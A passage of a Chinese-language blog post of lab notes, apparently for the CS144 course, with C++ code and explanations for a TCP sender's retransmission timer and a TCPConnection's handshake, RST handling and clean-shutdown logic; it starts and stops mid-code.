(!msg.ackno.<span class="hljs-built_in">has_value</span>()) &#123;<br>        ;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> recv_abs_seqno = msg.ackno.<span class="hljs-built_in">value</span>().<span class="hljs-built_in">unwrap</span>(isn_, next_abs_seqno_);<br>        <span class="hljs-keyword">if</span> (recv_abs_seqno &gt; next_abs_seqno_) &#123;<br>            <span class="hljs-comment">// Impossible, we couldn&#x27;t transmit future data</span><br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = outstanding_seg_.<span class="hljs-built_in">begin</span>(); iter != outstanding_seg_.<span class="hljs-built_in">end</span>();) &#123;<br>            <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;[abs_seqno, segment] = *iter;<br>          <span class="hljs-comment">// 如果当前的未发送的片段的序列号小于已经确认的，说明是已经确认了</span><br>            <span class="hljs-keyword">if</span> (abs_seqno + segment.<span class="hljs-built_in">sequence_length</span>() &lt;= recv_abs_seqno) &#123;<br>                outstanding_seqno_ -= segment.<span class="hljs-built_in">sequence_length</span>();<br>                iter = outstanding_seg_.<span class="hljs-built_in">erase</span>(iter);<br>                <span class="hljs-comment">// reset RTO and if outstanding data is not empty, start timer，为什么要重新计时？</span><br>                RTO_timeout_ = initial_RTO_ms_;<br>                <span class="hljs-keyword">if</span> (!outstanding_seg_.<span class="hljs-built_in">empty</span>()) &#123;<br>                    timer_ = <span class="hljs-number">0</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        consecutive_retransmission_times_ = <span class="hljs-number">0</span>;<br>    &#125;<br>    window_size_ = msg.window_size;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPSender::tick</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">size_t</span> ms_since_last_tick)</span></span><br><span class="hljs-function"></span>&#123;<br>    timer_ += ms_since_last_tick;<br>    <span class="hljs-keyword">auto</span> iter = outstanding_seg_.<span class="hljs-built_in">begin</span>();<br>    <span class="hljs-keyword">if</span> (timer_ &gt;= RTO_timeout_ &amp;&amp; iter != outstanding_seg_.<span class="hljs-built_in">end</span>()) &#123;<br>        <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;[abs_seqno, segment] = *iter;<br>        <span class="hljs-keyword">if</span> (window_size_ &gt; <span class="hljs-number">0</span>) &#123;<br>            RTO_timeout_ *= <span class="hljs-number">2</span>;<br>        &#125;<br>        timer_ = <span class="hljs-number">0</span>;<br>        consecutive_retransmission_times_++;<br>        segments_out_.<span class="hljs-built_in">push</span>(segment);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>tick可以理解为心脏跳动，每隔一段时间自动调用，理想情况下这个时间间隔是一样的（但实际是这样吗？），而基于tick方法可以设置一个定时器，比如说，当开始发送的时候，定时器标志位为true，并且timer=0，每次调用tick方法都会累计timer的值，如果segment发送并在规定时间内返回，则timerreset为0，同时处理掉缓存区那些已经确认的segment；与此同时，由于tick定期调用，如果发现timer超时了，则重新发送最旧的没有收到对应ack的segment；</p><blockquote><p>这里有个细节问题：当收到有效的ackno的时候，始终resettimer，很明显不会触发重新发送，这个时候有没有可能实际上之前发送的某个segment超时了呢？然而没触发超时。</p><p>这和超时时间的设置有很大关系，假设当前发送的sgement丢失了，然后Sender调用receive，此时由于没有正确的ackno并不会reset计时器，继而send下一个segment，并收到响应（这个时候前一个timer的时间就达到了&gt;2RTT），在还没调用本次receive方法之前，就触发了超时重传，</p><p>seqno和ackseqno究竟是什么</p><p>tcp是以segment为单位进行发送和接收的，会丢失segment</p><p>当发生segment丢失，接收方做什么？</p><p>不会调用receive方法，如果下一个响应到来，对该segment调用receive方法，</p></blockquote><h2 id="tcp-connection">TCP Connection</h2><p>TCPConnection的一个重要功能是决定TCP连接什么时候完全结束。当TCP连接完全结束时，停止对任何接收到的segment回复ackno，并且active()方法返回false。</p><p>TCP连接有两种关闭的方法：</p><p>不干净的关闭：TCPConnection发送或接收到一个首部字段中的RST标志位被设置的segment。这种情况下，inbound和outbound的ByteStream都处于errorstate，并且active()方法可以马上返回false 。</p><p>干净的关闭：在没有error的情况下关闭（active()=false）。这种情况可以尽可能地保证两个字节流都完全可靠地交付到接收对等方。</p><p>由于两将军问题，不可能保证对等方都能完全干净关闭连接，但是可以非常接近。</p><p>从一个对等设备的角度来看，对其与“远程”对等设备的连接进行干净关闭有四个先决条件，条件1保证了输入流被读取干净了，条件2和3保证了输出流被对等方读取干净了。条件4也是关于输入流的，保证了输入流的正常关闭。</p><p>输入流被完全确认（StreamReassembler为空）并且结束（收到了FIN）</p><p>输出流被应用层结束（调用ByteStream的end_input()方法），并且被完全发送出去（ByteStream为空），首部字段包括FIN的segment也被发送出去。</p><p>输出流被对等方完全确认（对方的StreamReassembler为空，实际上要求本地的_outstanding_segments为空）</p><p>本地TCPConnection需要让对等方满足条件3。有两种方式：</p><p>选择A：在两个流都已经结束后 linger 一段时间：</p><p>本地TCPConnection确认了整个输入流，但是难以确认对等端是否知道自己确认了整个输入流，即对等端是否收到ack（因为对等端不会对本地发送的ack进行ack）。如果不能确保对等端收到ack，也就不能确保对等端的_outstanding_segments为空，那么对等端就有可能不停地重传无法得到本地确认的segment，输入流永远无法关闭。</p><p>我们可以让本地的TCPConnection等待一段时间，如果对等端没有重传任何东西，那么就可以相信对等端收到了ack。</p><p>具体地，当一个连接满足条件1到条件3，并且在收到对等端最后一个segment后，等待了至少初始重传超时时间（_cfg.rt_timeout）的十倍，才能断开。</p><p>这意味着TCPConnection需要保持alive一段时间，保持对本地端口号的独占声明并可能发送acks 以响应传入的segment，即使在 TCPSender 和 TCPReceiver完全完成其工作并且两个流都已经结束了。</p><p>选择B：被动关闭</p><p>如果在TCPConnection发送FIN之前，TCPConnection的输入流就结束了（收到了FIN），那么这个TCPConnection在两个流结束后不需要linger。（因为FIN在发送ack之后，所以FIN的seqno大于之前发送的ack，所以对方对FIN的确认，就相当于确认了之前发送的所有ack</p><p>在lab 4中，我们将创建总体模块，称为TCPconnection，该模块将TCPSender和TCPReceiver结合起来。</p><p>我们的TCPsegment可以封装到用户(TCP-In-UDP)或IP(TCP/IP)数据报的有效载荷中。</p><p>https://blog.csdn.net/qq_45698833/article/details/120536017</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tcp_connection.hh&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">TCPConnection::remaining_outbound_capacity</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> _sender.<span class="hljs-built_in">stream_in</span>().<span class="hljs-built_in">remaining_capacity</span>(); &#125;<br><br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">TCPConnection::bytes_in_flight</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> _sender.<span class="hljs-built_in">bytes_in_flight</span>(); &#125;<br><br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">TCPConnection::unassembled_bytes</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> _receiver.<span class="hljs-built_in">unassembled_bytes</span>(); &#125;<br><br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">TCPConnection::time_since_last_segment_received</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> _time_since_last_segment_received;&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">TCPConnection::active</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> _active; &#125;<br><br><span class="hljs-comment">// 由操作系统调用，接收从UDP或IP数据报中的解封装的TCPsegment</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPConnection::segment_received</span><span class="hljs-params">(<span class="hljs-type">const</span> TCPSegment &amp;seg)</span> </span>&#123; <br>    <span class="hljs-comment">// 如果连接断开了，不接收任何segment</span><br>    <span class="hljs-keyword">if</span>(!_active)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 接收到一个segment，重置计数</span><br>    _time_since_last_segment_received = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 被动建立连接的一方可能处于的状态,处于listen状态</span><br>    <span class="hljs-comment">// 没有收到过任何segment，也没有发送过任何segment,</span><br>    <span class="hljs-keyword">if</span>(!_receiver.<span class="hljs-built_in">ackno</span>().<span class="hljs-built_in">has_value</span>() &amp;&amp; _sender.<span class="hljs-built_in">next_seqno_absolute</span>() == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">// 只接收syn</span><br>        <span class="hljs-keyword">if</span>(!seg.<span class="hljs-built_in">header</span>().syn)&#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        _receiver.<span class="hljs-built_in">segment_received</span>(seg);<br>        <span class="hljs-comment">// 收到对方的syn，就发送SYN与对方建立连接，处于SYN_RECV状态</span><br>        <span class="hljs-comment">// 三次握手的阶段二</span><br>        <span class="hljs-built_in">connect</span>();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 主动建立连接的一方可能处于的状态,处于SYN_SENT状态，三次握手的阶段一</span><br>    <span class="hljs-comment">// 发送出去的流没有得到确认，也没有收到过对方的segment。</span><br>    <span class="hljs-keyword">if</span>(_sender.<span class="hljs-built_in">next_seqno_absolute</span>() &gt; <span class="hljs-number">0</span> &amp;&amp; _sender.<span class="hljs-built_in">bytes_in_flight</span>() == _sender.<span class="hljs-built_in">next_seqno_absolute</span>() &amp;&amp; <br>       !_receiver.<span class="hljs-built_in">ackno</span>().<span class="hljs-built_in">has_value</span>())&#123;<br>        <span class="hljs-comment">// 如果有效载荷不为0，不符合SYN，直接丢弃</span><br>        <span class="hljs-keyword">if</span>(seg.<span class="hljs-built_in">payload</span>().<span class="hljs-built_in">size</span>() )&#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// 如果ack等于0，则双方同时发起了建立连接</span><br>        <span class="hljs-keyword">if</span>(!seg.<span class="hljs-built_in">header</span>().ack)&#123;<br>            <span class="hljs-keyword">if</span>(seg.<span class="hljs-built_in">header</span>().syn)&#123;<br>                _receiver.<span class="hljs-built_in">segment_received</span>(seg);<br>                <span class="hljs-comment">// 发送空的segment，以返回ack</span><br>                _sender.<span class="hljs-built_in">send_empty_segment</span>();<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// 如果syn=1，ack=1，rst=1，则关闭连接</span><br>        <span class="hljs-keyword">if</span>(seg.<span class="hljs-built_in">header</span>().rst)&#123;<br>            _receiver.<span class="hljs-built_in">stream_out</span>().<span class="hljs-built_in">set_error</span>();<br>            _sender.<span class="hljs-built_in">stream_in</span>().<span class="hljs-built_in">set_error</span>();<br>            _active = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 如果syn=1，ack=1，rst!=1，或者其他情况</span><br>    _receiver.<span class="hljs-built_in">segment_received</span>(seg);<br>    _sender.<span class="hljs-built_in">ack_received</span>(seg.<span class="hljs-built_in">header</span>().ackno,seg.<span class="hljs-built_in">header</span>().win);<br>    <span class="hljs-comment">// 发送确认的报文，进入ESTABLISHED状态，连接建立。处于三次握手的第三阶段</span><br>    <span class="hljs-keyword">if</span> (_sender.<span class="hljs-built_in">stream_in</span>().<span class="hljs-built_in">buffer_empty</span>() &amp;&amp; seg.<span class="hljs-built_in">length_in_sequence_space</span>())<br>        _sender.<span class="hljs-built_in">send_empty_segment</span>();<br>    <span class="hljs-keyword">if</span> (seg.<span class="hljs-built_in">header</span>().rst) &#123;<br>        _sender.<span class="hljs-built_in">send_empty_segment</span>();<br>        <span class="hljs-built_in">unclean_shutdown</span>();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">send_sender_segments</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">TCPConnection::write</span><span class="hljs-params">(<span class="hljs-type">const</span> string &amp;data)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(data.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// 向TCPSender的ByteStream中写入数据</span><br>    <span class="hljs-type">size_t</span> write_size = _sender.<span class="hljs-built_in">stream_in</span>().<span class="hljs-built_in">write</span>(data);<br>    _sender.<span class="hljs-built_in">fill_window</span>();<br>    <span class="hljs-comment">// 对TCPSender中的segment设置ackno和windowsize,再发送给对等端</span><br>    <span class="hljs-built_in">send_sender_segments</span>();<br>    <span class="hljs-keyword">return</span> write_size;<br>&#125;<br><br><span class="hljs-comment">// 此方法被OS周期性调用</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPConnection::tick</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">size_t</span> ms_since_last_tick)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(!_active)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    _time_since_last_segment_received += ms_since_last_tick;<br>    <span class="hljs-comment">// 告知TCPSender过去的时间</span><br>    _sender.<span class="hljs-built_in">tick</span>(ms_since_last_tick);<br>    <span class="hljs-comment">// 如果连续重传的次数超过上限，则强制关闭连接</span><br>    <span class="hljs-keyword">if</span>(_sender.<span class="hljs-built_in">consecutive_retransmissions</span>() &gt; TCPConfig::MAX_RETX_ATTEMPTS)&#123;<br>        <span class="hljs-built_in">unclean_shutdown</span>();    <br>    &#125;<br>    <span class="hljs-built_in">send_sender_segments</span>();<br>&#125;<br><br><span class="hljs-comment">// 结束向TCPConnection中写入，也就是关闭输出流（仍然允许读取输入的数据）</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPConnection::end_input_stream</span><span class="hljs-params">()</span> </span>&#123;<br>    _sender.<span class="hljs-built_in">stream_in</span>().<span class="hljs-built_in">end_input</span>();<br>    <span class="hljs-comment">// 发送fin，不能保证这一次能将fin发送出去，因为接收窗口有可能空间不够，ByteStream无法全部发送出去</span><br>    _sender.<span class="hljs-built_in">fill_window</span>();<br>    <span class="hljs-built_in">send_sender_segments</span>();<br>&#125;<br><br><span class="hljs-comment">// 主动连接</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPConnection::connect</span><span class="hljs-params">()</span> </span>&#123;<br>    _sender.<span class="hljs-built_in">fill_window</span>();<br>    <span class="hljs-built_in">send_sender_segments</span>();<br>&#125;<br><br><br><br><span class="hljs-comment">// 对TCPSender的 _segments_out中的segment设置首部的ackno和windowsize字段，还有ACK标志位</span><br><span class="hljs-comment">// 再加入到TCPConnection的 _segments_out，真正地将TCPsegment发送出去</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPConnection::send_sender_segments</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">// 此处必须要是引用类型，才能指向_sender中的同一个成员变量,才能对其进行操作</span><br>    <span class="hljs-comment">// std::queue&lt;TCPSegment&gt;&amp;sender_segs_out = _sender.segments_out();</span><br><br>    <span class="hljs-comment">// 对TCPSender的 _segments_out进行遍历，将所有的segment的头部都加上ackno和windowsize</span><br>    <span class="hljs-comment">// 再发送出去</span><br>    <span class="hljs-keyword">while</span>(!_sender.<span class="hljs-built_in">segments_out</span>().<span class="hljs-built_in">empty</span>())&#123;<br>        TCPSegment seg = _sender.<span class="hljs-built_in">segments_out</span>().<span class="hljs-built_in">front</span>();<br>        _sender.<span class="hljs-built_in">segments_out</span>().<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-comment">// 只有当ackno()的返回值非空时，才需要加上</span><br>        <span class="hljs-keyword">if</span>(_receiver.<span class="hljs-built_in">ackno</span>().<span class="hljs-built_in">has_value</span>())&#123;<br>            seg.<span class="hljs-built_in">header</span>().ack = <span class="hljs-literal">true</span>;<br>            seg.<span class="hljs-built_in">header</span>().ackno = _receiver.<span class="hljs-built_in">ackno</span>().<span class="hljs-built_in">value</span>();<br>            seg.<span class="hljs-built_in">header</span>().win = _receiver.<span class="hljs-built_in">window_size</span>();<br>        &#125;<br>        <span class="hljs-comment">// 将segment真正发送出去</span><br>        _segments_out.<span class="hljs-built_in">push</span>(seg);<br>    &#125;<br>    <span class="hljs-comment">// 每次发送segment后，都需要判断是否需要干净关闭连接</span><br>    <span class="hljs-built_in">clean_shutdown</span>();<br>    <br>&#125;<br><span class="hljs-comment">// 不干净的关闭，直接强制关闭连接</span><br><span class="hljs-comment">// 将输入输出流设置为错误状态</span><br><span class="hljs-comment">// 将连接的active置为false，向对等方发送rst</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPConnection::unclean_shutdown</span><span class="hljs-params">()</span></span>&#123;<br>    _receiver.<span class="hljs-built_in">stream_out</span>().<span class="hljs-built_in">set_error</span>();<br>    _sender.<span class="hljs-built_in">stream_in</span>().<span class="hljs-built_in">set_error</span>();<br>    _active = <span class="hljs-literal">false</span>;<br>    TCPSegment seg = _sender.<span class="hljs-built_in">segments_out</span>().<span class="hljs-built_in">front</span>();<br>    _sender.<span class="hljs-built_in">segments_out</span>().<span class="hljs-built_in">pop</span>();<br>    seg.<span class="hljs-built_in">header</span>().ack = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span>(_receiver.<span class="hljs-built_in">ackno</span>().<span class="hljs-built_in">has_value</span>())&#123;<br>        seg.<span class="hljs-built_in">header</span>().ackno = _receiver.<span class="hljs-built_in">ackno</span>().<span class="hljs-built_in">value</span>();<br>    &#125;<br>    seg.<span class="hljs-built_in">header</span>().win = _receiver.<span class="hljs-built_in">window_size</span>();<br>    seg.<span class="hljs-built_in">header</span>().rst = <span class="hljs-literal">true</span>;<br>    _segments_out.<span class="hljs-built_in">push</span>(seg);<br><br>&#125;<br><br><span class="hljs-comment">// 干净关闭连接，判断能否干净地关闭连接，</span><br><span class="hljs-comment">// 判断是否需要在两个流结束后linger一段时间</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPConnection::clean_shutdown</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">// 自己的接收的StreamReassembler（重组缓存）为空</span><br>    <span class="hljs-keyword">if</span>(_receiver.<span class="hljs-built_in">stream_out</span>().<span class="hljs-built_in">input_ended</span>())&#123;<br>        <span class="hljs-comment">// 如果sender的输出流还没有结束，即ByteStream不为空，fin还没有发送出去</span><br>        <span class="hljs-keyword">if</span>(!_sender.<span class="hljs-built_in">stream_in</span>().<span class="hljs-built_in">eof</span>())&#123;<br>        <span class="hljs-comment">// 那么需要在两个流结束后linger一段时间</span><br>            _linger_after_streams_finish = <span class="hljs-literal">false</span>;<br>        <span class="hljs-comment">// 如果sender发送了fin，且得到了确认</span><br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(_sender.<span class="hljs-built_in">bytes_in_flight</span>() == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-comment">// 那么只有不需要linger或者linger了指定时间后，才能断开连接</span><br>            <span class="hljs-keyword">if</span>(!_linger_after_streams_finish || <span class="hljs-built_in">time_since_last_segment_received</span>() &gt;= <span class="hljs-number">10</span> * _cfg.rt_timeout)&#123;<br>                _active = <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br> <br><br>  TCPConnection::~<span class="hljs-built_in">TCPConnection</span>() &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">active</span>()) &#123;<br>            cerr &lt;&lt; <span class="hljs-string">&quot;Warning: Unclean shutdown of TCPConnection\n&quot;</span>;<br>            _sender.<span class="hljs-built_in">send_empty_segment</span>();<br>            <span class="hljs-built_in">unclean_shutdown</span>();<br>            <span class="hljs-comment">// Your code here: need to send a RST segment to the peer</span><br>        &#125;<br>    &#125; <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> exception &amp;e) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Exception destructing TCP FSM: &quot;</span> &lt;&lt; e.<span class="hljs-built_in">what</span>() &lt;&lt; std::endl;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zephir">发送：TCPConnection::write =&gt; send_sender_segments: 遍历Sender的segments，包装其头部，放到一段内存缓存里 =&gt; clean_shutdown: 看下是否需要关闭<br><br>接收：TCPConnection::segment_received =&gt; send_sender_segments 放到一段内存缓存里<br></code></pre></td></tr></table></figure><h2 id="ip">IP</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span 